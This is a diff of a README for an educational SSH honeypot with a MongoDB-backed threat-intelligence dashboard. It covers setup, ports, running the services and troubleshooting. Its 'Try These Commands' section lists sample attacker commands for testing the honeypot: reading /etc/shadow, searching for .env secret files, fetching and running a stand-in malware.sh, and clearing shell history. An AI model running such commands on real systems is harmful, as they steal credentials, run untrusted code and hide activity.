@@ -1,40 +1,48 @@
 # 🛡️ AI Honeypot Threat Intelligence System
 
-A complete cybersecurity honeypot solution with real-time threat intelligence dashboard.
+A complete cybersecurity honeypot solution with real-time threat intelligence dashboard, built on the MERN stack architecture (MongoDB, Express/Flask, React, Node.js).
 
 ## 🎯 Overview
 
-This project consists of three main components:
+This project consists of four main components:
 
-| Component | Description | Port |
-|-----------|-------------|------|
-| **Honeypot Server** | SSH honeypot that simulates a Linux production server | 2222 |
-| **API Server** | Flask backend that serves live data from logs | 5000 |
-| **Dashboard** | React frontend for visualizing threat intelligence | 5173 |
+| Component       | Description                                              | Port  |
+| --------------- | -------------------------------------------------------- | ----- |
+| **Database**    | MongoDB server storing commands, sessions, and analytics | 27017 |
+| **Honeypot**    | SSH honeypot that simulates a Linux production server    | 2222  |
+| **API Server**  | Flask backend that serves live DB data to the frontend   | 5000  |
+| **Dashboard**   | React frontend for visualizing threat intelligence       | 5173  |
 
 ---
 
 ## 📋 Prerequisites
 
-- **Python 3.8+** with pip
+- **MongoDB Server** (Community Edition or Atlas)
+- **Python 3.8+**
 - **Node.js 18+** with npm
-- **Git** (optional)
 
 ---
 
 ## 🚀 Quick Start
 
-### Step 1: Install Python Dependencies
+### Step 1: Ensure MongoDB is Running
+
+Make sure your MongoDB server is running on `mongodb://localhost:27017`.
+- **Windows**: Start the "MongoDB Server (MongoDB)" service via `services.msc`.
+- **macOS/Linux**: Run `mongod`.
+
+### Step 2: Install Python Dependencies
 
 ```bash
-cd c:\Users\vishn\OneDrive\Desktop\devH
-pip install paramiko flask flask-cors
+cd Honeypot
+pip install -r requirements.txt
+# Or manually: pip install paramiko flask flask-cors geoip2 pymongo
 ```
 
-### Step 2: Install Dashboard Dependencies
+### Step 3: Install Dashboard Dependencies
 
 ```bash
-cd dashboard
+cd Honeypot/dashboard
 npm install
 ```
 
@@ -42,12 +50,12 @@ npm install
 
 ## ▶️ Running the Project
 
-You need **3 terminal windows** to run all components:
+You need **3 terminal windows** to run all components (assuming MongoDB is already running in the background):
 
 ### Terminal 1: Start the Honeypot Server
 
 ```bash
-cd c:\Users\vishn\OneDrive\Desktop\devH
+cd Honeypot
 python main.py
 ```
 
@@ -61,13 +69,13 @@ Expected output:
 ### Terminal 2: Start the API Server
 
 ```bash
-cd c:\Users\vishn\OneDrive\Desktop\devH
+cd Honeypot
 python api_server.py
 ```
 
 Expected output:
 ```
-[*] Starting Honeypot API Server...
+[*] Starting Honeypot API Server (MongoDB)...
 [*] API available at http://localhost:5000
  * Running on http://127.0.0.1:5000
 ```
@@ -75,7 +83,7 @@ Expected output:
 ### Terminal 3: Start the Dashboard
 
 ```bash
-cd c:\Users\vishn\OneDrive\Desktop\devH\dashboard
+cd Honeypot/dashboard
 npm run dev
 ```
 
@@ -89,17 +97,8 @@ VITE v7.x.x ready in xxx ms
 
 ## 🌐 Accessing the Dashboard
 
-Open your browser and navigate to:
-
-**http://localhost:5173**
-
-You will see the AI Honeypot Threat Intelligence Dashboard with:
-- 📊 Real-time metrics
-- 👥 Live session monitoring
-- 📜 Command timeline
-- 🎬 Session replay
-- 📈 Analytics & charts
-- ⚙️ Settings
+Open your browser and navigate to **http://localhost:5173**. 
+You will see the threat dashboard with real-time metrics, live sessions, a command timeline, session replay capabilities, and a global threat map.
 
 ---
 
@@ -114,200 +113,90 @@ ssh -p 2222 admin@localhost
 ```
 
 When prompted:
-- Enter **any password** (authentication accepts all passwords)
-- Type `yes` to accept the host key (first time only)
+- Enter **any password** (the honeypot accepts all passwords to trap attackers).
+- Type `yes` to accept the host key if warned.
 
 ### Try These Commands
 
-Once connected, try these commands to generate threat data:
+Generate threat data by acting like an attacker:
 
 ```bash
-# Basic reconnaissance
+# Basic reconnaissance (Low severity)
 ls
 pwd
 whoami
 uname -a
 
-# System exploration
+# System exploration (Medium severity)
 cat /etc/passwd
 ps aux
 netstat -an
 
-# Suspicious activity (high skill level)
+# Suspicious activity (High severity)
 sudo -l
 cat /etc/shadow
-find / -name "*.env" 2>/dev/null
 wget http://example.com/malware.sh
+nohup ./malware &
 history -c
-
-# Exit when done
 exit
 ```
 
-### Watch the Dashboard Update
-
-1. Go to **http://localhost:5173** in your browser
-2. The dashboard auto-refreshes every **10 seconds**
-3. You'll see:
-   - New sessions appear in the sessions table
-   - Commands flowing in the Command Timeline
-   - Metrics updating (total commands, high-risk actions)
-   - Charts reflecting the new data
+**Watch the Dashboard Update:** 
+Your commands will be instantly logged to MongoDB, categorized by the AI deception engine, and reflected in real-time on the React dashboard.
 
 ---
 
 ## 📂 Project Structure
 
 ```
-devH/
+Honeypot/
 ├── main.py                  # Honeypot server entry point
 ├── honeypot.py              # SSH honeypot session handler
 ├── commands.py              # Command simulation engine
-├── filesystem.py            # Virtual file system
-├── deception.py             # AI-powered deception engine
-├── session_recorder.py      # Session recording & analysis
-├── api_server.py            # Flask API server
-├── honeypot_audit.json      # Live audit logs (auto-generated)
-├── honeypot_host_key.pem    # SSH host key (auto-generated)
-├── session_recordings/      # Session transcripts
+├── filesystem.py            # Virtual file system & decoying
+├── deception.py             # AI-powered deception & skill analysis
+├── session_recorder.py      # Session transcript compiler
+├── logger.py                # Audit log generator
+├── database.py              # MongoDB connection & schema manager
+├── api_server.py            # Flask REST API server
+├── verify_honeypot.py       # Automated testing script
+├── requirements.txt         # Python dependencies
 └── dashboard/               # React frontend
     ├── src/
-    │   ├── App.jsx
-    │   ├── components/
-    │   │   ├── Layout.jsx
-    │   │   ├── MetricCard.jsx
-    │   │   ├── SessionsTable.jsx
-    │   │   ├── CommandFeed.jsx
-    │   │   ├── Charts.jsx
-    │   │   └── TerminalReplay.jsx
-    │   ├── pages/
-    │   │   ├── Dashboard.jsx
-    │   │   ├── LiveSessions.jsx
-    │   │   ├── CommandTimeline.jsx
-    │   │   ├── SessionReplay.jsx
-    │   │   ├── Analytics.jsx
-    │   │   └── Settings.jsx
-    │   └── services/
-    │       └── api.js
+    │   ├── components/      # Reusable UI charts and tables
+    │   ├── pages/           # Dashboard views (Timeline, Replay, Map)
+    │   └── services/        # API client
     └── package.json
 ```
 
 ---
 
-## 🔌 API Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/health` | GET | Health check |
-| `/api/metrics` | GET | Dashboard statistics |
-| `/api/sessions` | GET | All sessions with details |
-| `/api/commands` | GET | Command timeline (last 100) |
-| `/api/commands/frequency` | GET | Command frequency for charts |
-| `/api/analytics/risk-distribution` | GET | Risk level distribution |
-| `/api/analytics/skill-distribution` | GET | Skill level distribution |
-| `/api/analytics/timeline` | GET | Commands over time |
-| `/api/session/<id>/replay` | GET | Session replay data |
-
----
-
 ## 🛑 Stopping the Services
 
-To stop each service, press `Ctrl+C` in the respective terminal:
-
-- **Terminal 1**: Stop Honeypot Server
-- **Terminal 2**: Stop API Server  
-- **Terminal 3**: Stop Dashboard
+Press `Ctrl+C` in each terminal to stop the corresponding service safely. MongoDB will continue running in the background unless explicitly stopped.
 
 ---
 
 ## 🔧 Troubleshooting
 
 ### Port Already in Use
-
-If you see "port already in use" errors:
-
 ```bash
-# Find and kill process on port 2222 (honeypot)
-netstat -ano | findstr :2222
-taskkill /PID <pid> /F
-
-# Find and kill process on port 5000 (API)
-netstat -ano | findstr :5000
-taskkill /PID <pid> /F
-
-# Find and kill process on port 5173 (dashboard)
-netstat -ano | findstr :5173
+# Windows
+netstat -ano | findstr :2222  # Replace 2222 with the blocked port
 taskkill /PID <pid> /F
 ```
 
+### Database Errors
+Ensure MongoDB is running locally on port `27017`. You can modify the connection string by setting the `MONGO_URI` environment variable before starting the API server and Honeypot server.
+
 ### SSH Host Key Warning
-
-If you get "REMOTE HOST IDENTIFICATION HAS CHANGED" warning:
-
+If you get "REMOTE HOST IDENTIFICATION HAS CHANGED":
 ```bash
 ssh-keygen -R "[localhost]:2222"
 ```
 
-Then try connecting again.
-
-### API Not Responding
-
-Make sure both `main.py` and `api_server.py` are running before accessing the dashboard.
-
 ---
 
-## 🎨 Dashboard Features
+## 📝 License & Disclaimer
 
-### 1. Dashboard Page (`/`)
-- Metric cards with live statistics
-- Sessions table with skill/risk badges
-- Command feed with real-time updates
-- Charts: Command frequency, Risk distribution, Timeline
-
-### 2. Live Sessions (`/sessions`)
-- Search and filter sessions
-- Detailed session cards
-- View last command executed
-- Action buttons for view/replay
-
-### 3. Command Timeline (`/timeline`)
-- Color-coded command categories
-- Expandable command details
-- Category filtering
-- Live stream indicator
-
-### 4. Session Replay (`/replay`)
-- Terminal emulator interface
-- Play/Pause/Step controls
-- Session selection sidebar
-- Typing animation effect
-
-### 5. Analytics (`/analytics`)
-- Summary statistics
-- Command frequency bar chart
-- Risk distribution donut chart
-- Skill level heatmap
-- Top threat sources table
-
-### 6. Settings (`/settings`)
-- Honeypot configuration
-- Alert settings
-- Geo-blocking options
-
----
-
-## 📝 License
-
-This project is for educational and research purposes only.
-
----
-
-## 🙏 Credits
-
-Built with:
-- [Paramiko](https://www.paramiko.org/) - SSH implementation
-- [Flask](https://flask.palletsprojects.com/) - API server
-- [React](https://react.dev/) - Frontend framework
-- [Tailwind CSS](https://tailwindcss.com/) - Styling
-- [Recharts](https://recharts.org/) - Charts
-- [Lucide](https://lucide.dev/) - Icons
+This project is for educational and threat intelligence research purposes only. Do not deploy a honeypot on a production network without understanding the security implications.
